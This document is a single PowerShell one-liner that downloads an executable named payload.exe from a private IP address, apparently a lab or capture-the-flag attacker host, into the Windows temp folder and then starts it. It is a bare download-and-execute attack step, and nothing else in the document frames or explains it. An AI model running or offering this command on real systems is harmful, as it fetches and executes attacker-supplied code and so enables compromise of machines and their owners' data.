powershell -c "Invoke-WebRequest -Uri http://10.10.14.105/payload.exe -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe"


